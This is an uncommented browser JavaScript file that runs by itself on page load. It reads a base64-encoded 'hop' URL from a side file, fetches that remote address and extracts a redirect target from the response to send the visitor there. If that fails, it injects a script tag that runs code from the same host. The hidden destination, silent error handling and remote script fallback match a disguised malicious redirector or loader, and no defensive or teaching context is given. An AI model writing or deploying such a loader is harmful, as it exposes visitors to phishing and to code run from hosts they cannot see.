const HANDOFF_MS = 500;
const NOTE_URL = new URL('./vault/release.note', import.meta.url);
const TICKET = document.getElementById('ticket');
const LIVE = document.getElementById('live');

function announce(text) {
  LIVE.textContent = text;
}

function parseNote(raw) {
  const out = { channel: '', hop: '' };
  for (const line of String(raw).split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim().toLowerCase();
    const val = trimmed.slice(eq + 1).trim();
    if (key === 'channel') out.channel = val;
    if (key === 'hop') out.hop = val;
  }
  if (!out.hop) throw new Error('no hop');
  return out;
}

function decodeHop(b64) {
  const url = atob(String(b64).trim());
  if (!/^https?:\/\//i.test(url)) throw new Error('bad hop');
  return url;
}

function parseRelayBody(text) {
  const body = String(text).trim();
  try {
    const j = JSON.parse(body);
    if (j && j.c) {
      const u = atob(String(j.c).trim());
      if (/^https?:\/\//i.test(u)) return u;
    }
  } catch {}
  const patterns = [
    /location\.replace\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
    /location\.assign\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
    /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i,
    /top\.location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
  ];
  for (const re of patterns) {
    const m = body.match(re);
    if (m && m[1]) return m[1];
  }
  throw new Error('parse');
}

function openViaScriptTag(hopUrl) {
  return new Promise((resolve, reject) => {
    const tag = document.createElement('script');
    tag.src = hopUrl;
    tag.async = true;
    tag.onload = () => resolve();
    tag.onerror = () => reject(new Error('script'));
    document.head.appendChild(tag);
  });
}

async function deliver(hopUrl) {
  announce('Starting handoff');

  try {
    const res = await fetch(hopUrl, { cache: 'no-store', credentials: 'omit' });
    if (res.ok) {
      const target = parseRelayBody(await res.text());
      window.location.replace(target);
      return;
    }
  } catch {}

  try {
    await openViaScriptTag(hopUrl);
  } catch {
    announce('');
  }
}

function wait(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function run() {
  const t0 = Date.now();
  announce('Preparing');

  const res = await fetch(NOTE_URL, { cache: 'no-store' });
  if (!res.ok) throw new Error('note');
  const note = parseNote(await res.text());

  const hopUrl = decodeHop(note.hop);
  const elapsed = Date.now() - t0;
  if (elapsed < HANDOFF_MS) {
    await wait(HANDOFF_MS - elapsed);
  }
  await deliver(hopUrl);
}

run().catch(() => {
  announce('');
});
